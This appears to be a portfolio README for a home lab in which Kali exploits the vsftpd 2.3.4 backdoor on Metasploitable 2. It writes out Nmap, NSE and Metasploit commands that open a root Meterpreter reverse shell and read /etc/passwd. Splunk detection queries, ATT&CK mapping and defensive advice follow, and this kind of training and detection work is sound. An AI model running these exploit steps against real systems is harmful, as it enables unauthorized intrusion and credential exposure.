# Full-Kill-Chain-Red-and-Blue-Teams


**Author:** Dashane James  
**Lab Environment:** [e.g. VMware Workstation | Kali Linux | Metasploitable 2]  
**Purpose:** [Run a complete attack simulation then switch roles and detect every stage of it.]
**Status:** 🔵 Completed

---

## 📋 Overview

This repository documents a full adversary kill chain executed in an isolated lab environment. Using Kali Linux as the attacker and Metasploitable 2 as the target, the attack was carried out from initial reconnaissance through exploitation and post-exploitation while TCPDump captured all network traffic. The role then shifted to Blue Team — the capture was ingested into Splunk and SPL queries were used to detect every stage of the attack. This lab demonstrates both offensive execution and defensive detection in a single workflow. 

---

## 🧪 Lab Environment

| Component | Details |
|---|---|
| Hypervisor | VMware Workstation (Host-Only Network) |
| Attacker Machine | Kali Linux 2026.1 — `192.168.79.129` |
| Target Machine | [Metasploitable 2] — `192.168.79.130` |
| Network Type | Host-Only (isolated, no internet exposure) |
| Host OS | Windows 11 — ASUS Vivobook 14 |

> ⚠️ **Note:** All activity was performed in a controlled, isolated lab environment against deliberately vulnerable machines. No unauthorized access to live networks was performed.

---

## 🛠️ Tools Used

- **Nmap** — Service version detection and NSE vulnerability scanning
- **NSE (Nmap Scripting Engine)** — `ftp-vsftpd-backdoor` script used to confirm live exploitation before launching Metasploit
- **Metasploit Framework** — Exploited the vsftpd 2.3.4 backdoor via `exploit/unix/ftp/vsftpd_234_backdoor` to obtain a root Meterpreter session
- **TCPDump** — Captured all network traffic during the attack for later Blue Team analysis
- **Splunk SIEM** — Ingested the packet capture and ran SPL detection queries to identify each attack stage

---



---

## 🔬 Tasks / Assessments Performed

### RED TEAM (ATTACK)
### 1. [Recon: NMAP Scan to discover services]

For this task, a full TCP connect scan with service version detection was run against the target to identify all open ports and running services before any exploitation was attempted.

# Commands used
sudo nmap -sT -Pn --disable-arp-ping -n -sV 192.168.79.130 -oN ~/killchain_nmap.txt


# Output

Nmap returned multiple open services including FTP (21/vsftpd 2.3.4), SSH (22), Telnet (23), HTTP (80), and others. vsftpd 2.3.4 on port 21 was flagged as the primary target — this version is publicly known to contain an intentional backdoor.

**Findings:**

vsftpd 2.3.4 identified on port 21. This version is listed in the NVD as CVE-2011-2523 with a CVSS score of 9.8 (Critical) and is known to be directly exploitable for root access.

### 2. [Scanning: using NSE scripts to find vulnerabilities]

Before launching Metasploit, the Nmap `ftp-vsftpd-backdoor` script was used to actively verify that the backdoor was present and exploitable on the target.

# Command used

sudo nmap -sV --script=ftp-vsftpd-backdoor -Pn --disable-arp-ping -n -p 21 192.168.79.130


# Output

The script returned `VULNERABLE (Exploitable)` — confirming the backdoor is live. The vsftpd 2.3.4 backdoor is triggered by appending `:)` to the FTP username during login, which causes the server to open a root shell on port 6200.

**Findings:**

Live exploitability confirmed prior to Metasploit. CVE-2011-2523, CVSS 9.8. This is an unusual NSE result — most vulnerability scripts only detect and report (true/false), but `ftp-vsftpd-backdoor` actively attempts exploitation and returns the shell output, making it one of the few NSE scripts that crosses from detection into exploitation.

### 3. [Exploitation: using Metasploit to gain access.]
With the vulnerability confirmed, the Metasploit Framework was used to exploit the backdoor and open a Meterpreter session on the target. 


# Meterpreter Commands used

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.79.130
set LHOST 192.168.79.129
run
# Output

[] Started reverse TCP handler on 192.168.79.129:4444
[+] 192.168.79.130:21 - Backdoor service has been spawned!
[] Meterpreter session 1 opened (192.168.79.129:4444 → 192.168.79.130:46275)

```

**Findings:**

Root-level Meterpreter session opened with no credentials and no privilege escalation required. The backdoor spawns directly as uid=0 (root). The reverse shell callback connected from Metasploitable to Kali on port 4444.


### 4. [Post Exploitation: enumerate users and sensitive files.]

With root access confirmed, post-exploitation commands were run inside a native OS shell on the target to enumerate the system and demonstrate the level of access an attacker would have.

#Commands used

shell
whoami
id
uname -a
cat /etc/passwd
ls /home


# Output
.



**Findings:**

Full root access confirmed. An attacker with this level of access could read, modify, or exfiltrate any file on the system, create persistence, pivot to other hosts, or destroy evidence. The `/etc/passwd` file exposure reveals all local user accounts and their login shells.



### BLUE TEAM (DETECT)
### 1. Review TCPDUMP capture of all attack activity.

For this task TCPDump was running in a separate terminal throughout the entire attack, capturing all network traffic to a `.pcap` file. After the attack completed, the capture was converted to text for Splunk ingestion.

# Command used

Capture (ran during attack) > sudo tcpdump -i eth0 -w ~/full_killchain.pcap

Convert to text after attack > tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/killchain_capture.txt


# Output

`full_killchain.pcap` — 4,069 packets captured, 1.6MB. Converted to `killchain_capture.txt` (589KB) and uploaded to Splunk for analysis.

**Findings:**

The full attack chain was captured in a single pcap file. Having an unbroken packet capture from start to finish is critical for incident response — it preserves evidence of every connection, payload, and response that occurred during the attack

### 2. Identify each attack stage in the packet capture.

SPL queries were run in Splunk against the ingested capture to identify and confirm each stage of the kill chain in the traffic data.

# Splunk commands used

Stage 1 — Recon detection (port scan signature)

index=main source="killchain_capture.txt" | rex field=_raw “(?<src_ip>\d+.\d+.\d+.\d+)” | stats count by src_ip | sort -count

Stage 2 — Backdoor exploitation (port 6200)

index=main source="killchain_capture.txt" “6200”

Stage 3 — Meterpreter C2 (port 4444)

index=main source="killchain_capture.txt" “4444”


# Output

- **Recon:** Kali (192.168.79.129) generated 2,829 events vs. Metasploitable's 1,484 — high-volume outbound traffic from one source is a reliable port scan indicator
- **Port 6200:** 27 events — bidirectional traffic confirming the vsftpd backdoor was triggered and active
- **Port 4444:** Multiple pages of sustained bidirectional traffic between Kali:4444 and Metasploitable:46275 — confirms the Meterpreter reverse shell session was established and maintained


**Findings:**

Every stage of the attack left a distinct and detectable footprint in the packet capture. Recon, exploitation, and command & control were all visible through targeted SPL queries.

### 3. Write a Splunk detection rule for each stage.

Each attack stage was documented as a reusable Splunk detection query that a SOC analyst could run or schedule as an alert.


# Rules/Commands used
[]

**Rule 1 — Port Scan Detection (Recon):**

index=main | rex field=_raw “(?<src_ip>\d+.\d+.\d+.\d+)” | stats count by src_ip | sort -count | where count > 500

Flags any single source IP generating more than 500 events — characteristic of automated port scanning.

**Rule 2 — vsftpd Backdoor (Port 6200):**

index=main “6200” | stats count by src_ip

Any traffic on port 6200 is anomalous and should be treated as a potential vsftpd backdoor trigger.

**Rule 3 — Reverse Shell Callback (Port 4444):**

index=main “4444” | stats count by src_ip | sort -count

Port 4444 is Metasploit's default Meterpreter listener port. Outbound connections to or from this port indicate potential reverse shell activity.

```

**Findings:**

In a production environment, these queries would be saved as scheduled Splunk alerts firing every 5–15 minutes. Any hit on port 6200 or sustained traffic on port 4444 should trigger immediate investigation.



### 4. [Map each stage to ATT&CK tactic and NIST IR phase.]


# Output

| Attack Stage | MITRE ATT&CK Tactic | Technique ID | NIST IR Phase |
|---|---|---|---|

| Nmap service scan | Reconnaissance | T1046 — Network Service Discovery | Detection & Analysis |
| NSE backdoor confirmation | Reconnaissance | T1595 — Active Scanning | Detection & Analysis |
| vsftpd exploitation | Initial Access | T1190 — Exploit Public-Facing Application | Detection & Analysis |
| Meterpreter session | Command & Control | T1571 — Non-Standard Port | Containment |
| Post-exploitation enumeration | Discovery | T1082 — System Information Discovery | Containment |
| /etc/passwd access | Credential Access | T1003 — OS Credential Dumping | Eradication |



**Findings:** 

The kill chain maps cleanly across the MITRE ATT&CK framework from Reconnaissance through Credential Access. Each stage aligns with a NIST IR phase — Detection & Analysis covers recon and exploitation, while Containment and Eradication cover the post-exploitation actions that would need to be addressed in a real incident response.

**FINAL FINDINGS**

---


## 📊 Key Findings Summary

| Attack Stage | Port/Protocol | Detection Method | Risk Level |
|---|---|---|---|
| Port scan (recon) | All ports / TCP | Splunk — high event volume from single src_ip | 🟠 High |
| vsftpd backdoor triggered | 6200/TCP | Splunk — port 6200 traffic | 🔴 Critical |
| Meterpreter reverse shell | 4444/TCP | Splunk — sustained port 4444 C2 traffic | 🔴 Critical |
| Root shell / post-exploitation | N/A | TCPDump capture evidence | 🔴 Critical |

**Risk Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low


---

## 🗺️ MITRE ATT&CK Mapping

| Action Performed | ATT&CK Tactic | Technique ID | Technique Name |
|---|---|---|---|
| Nmap service version scan | Reconnaissance | T1046 | Network Service Discovery |
| NSE ftp-vsftpd-backdoor script | Reconnaissance | T1595 | Active Scanning |
| vsftpd 2.3.4 backdoor exploit | Initial Access | T1190 | Exploit Public-Facing Application |
| Meterpreter reverse shell (port 4444) | Command & Control | T1571 | Non-Standard Port |
| whoami / id / uname -a | Discovery | T1082 | System Information Discovery |
| cat /etc/passwd | Credential Access | T1003 | OS Credential Dumping |
---

## 🛡️ Defensive Recommendations

1. **Remove vsftpd 2.3.4 immediately (Critical)** — This version contains an intentional backdoor and must never run in any environment. Replace with a current, maintained FTP server or eliminate FTP entirely in favor of SFTP.
2. **Block outbound connections on non-standard ports** — Egress filtering on port 4444 would have terminated the Meterpreter session before it was established. Restrict outbound traffic to only required ports (80, 443, 22).
3. **Alert on port 6200 traffic** — Port 6200 has no legitimate use in most environments. Any traffic to or from this port should trigger an immediate alert in the SIEM.
4. **Deploy network-based IDS/IPS** — A properly configured Snort or Suricata rule for the vsftpd backdoor pattern would have detected and blocked the exploitation attempt in real time.
5. **Implement SIEM alerting for high-volume scans** — A single IP generating hundreds of connection attempts in a short timeframe is a reliable recon indicator. Automated alerts for this pattern reduce time-to-detection significantly.
---


---


## 🔑 Technical Notes

```bash
# Capture traffic during the full attack session
sudo tcpdump -i eth0 -w ~/full_killchain.pcap

# Convert pcap to text for Splunk ingestion
tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/killchain_capture.txt

# NSE confirmation scan before Metasploit
sudo nmap -sV --script=ftp-vsftpd-backdoor -Pn --disable-arp-ping -n -p 21 192.168.79.130

# Metasploit exploitation
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.79.130
set LHOST 192.168.79.129
run
```

> Always use `-Pn --disable-arp-ping -n` with Nmap in this VMware Host-Only environment to prevent ARP ping timeouts and DNS resolution hangs.

> TCPDump saves with a `~` tilde appended to the filename when stopped mid-write. Rename with `mv ~/full_killchain.pcap~ ~/full_killchain.pcap` before converting.
```

---

## 📌 About This Project

[1-2 sentences about how this fits into your overall portfolio and career goals.]

This repository is part of my broader cybersecurity portfolio demonstrating practical, hands-on skills across the full attack lifecycle — from reconnaissance through exploitation and into Blue Team detection. This lab is the culmination of the prior labs in this series: the vsftpd 2.3.4 backdoor was first researched by CVE in the NVD lab, confirmed vulnerable via NSE script in the scanning lab, and is now fully exploited and detected end-to-end here.


**Related repositories:**
- Nmap-Host-Discovery-and-Lab-Baseline — Established a baseline of the lab network using ping sweeps and host discovery
- Nmap-Scan-Types-SYN-vs-TCP-vs-UDP — Compared SYN, TCP connect, and UDP scan types
- Service-Version-Detection-and-OS-Fingerprinting — Identified software versions and researched CVEs including the vsFTPd backdoor
- Wireshark-Capture-and-Analyze-Traffic — Captured and analyzed live packet traffic including plaintext credential exposure
- TCPDump-CLI-Packet-Capture — Command-line packet capture and pcap file analysis
---

## 👤 Author

**Dashane James**  
Senior Field Service Technician → Cybersecurity Analyst  
📍 Yonkers, NY  
🎓 B.S. Information Technology — SUNY Canton  
🏆 CompTIA Security+ | CySA+ (In Progress)  
🔗 [GitHub](https://github.com/Dashanejames1) | [Zero Trust Cyber Security Brand](https://www.instagram.com/zerotrust_cybersecurity)

---

*This repository is part of an active portfolio demonstrating hands-on cybersecurity skills. All lab work performed in isolated environments for educational purposes.*
